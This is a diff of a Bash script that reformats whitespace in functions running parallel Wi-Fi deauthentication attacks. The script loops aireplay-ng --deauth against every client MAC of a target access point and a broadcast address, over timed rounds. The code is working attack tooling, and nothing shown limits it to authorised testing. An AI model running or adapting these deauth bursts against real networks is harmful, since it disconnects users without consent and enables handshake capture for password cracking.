@@ -16,7 +16,7 @@ _deauth_burst() {
     local -a macs=("$@")
     local -a pids=()
 
-    dbg "-- Round ${round}: parallel deauth to $(( ${#macs[@]} + 1 )) target(s) --"
+    dbg "-- Round ${round}: parallel deauth to $((${#macs[@]} + 1)) target(s) --"
 
     # One process per client, all simultaneous
     for mac in "${macs[@]}"; do
@@ -25,7 +25,7 @@ _deauth_burst() {
             --deauth "$DEAUTH_N" \
             -a "$TARGET" \
             -c "$mac" \
-            "$MON" >> "$log_file" 2>&1 &
+            "$MON" >>"$log_file" 2>&1 &
         pids+=($!)
     done
 
@@ -34,7 +34,7 @@ _deauth_burst() {
     aireplay-ng \
         --deauth "$DEAUTH_N" \
         -a "$TARGET" \
-        "$MON" >> "$log_file" 2>&1 &
+        "$MON" >>"$log_file" 2>&1 &
     pids+=($!)
 
     # Esperar a que todos terminen antes de la siguiente ronda
@@ -58,7 +58,7 @@ run_deauth() {
     done < <(get_client_macs)
 
     local n=${#client_macs[@]}
-    if (( n > 0 )); then
+    if ((n > 0)); then
         info "Parallel deauth: ${n} client(s) + broadcast  (${DEAUTH_ROUNDS} round(s))"
         for mac in "${client_macs[@]}"; do
             info "  -> ${mac}"
@@ -70,7 +70,7 @@ run_deauth() {
     (
         for r in $(seq 1 "$DEAUTH_ROUNDS"); do
             _deauth_burst "$r" "$log_file" "${client_macs[@]}"
-            (( r < DEAUTH_ROUNDS )) && sleep "$DEAUTH_INTERVAL"
+            ((r < DEAUTH_ROUNDS)) && sleep "$DEAUTH_INTERVAL"
         done
         dbg "Deauth cycle done (${DEAUTH_ROUNDS} rounds)."
     ) &
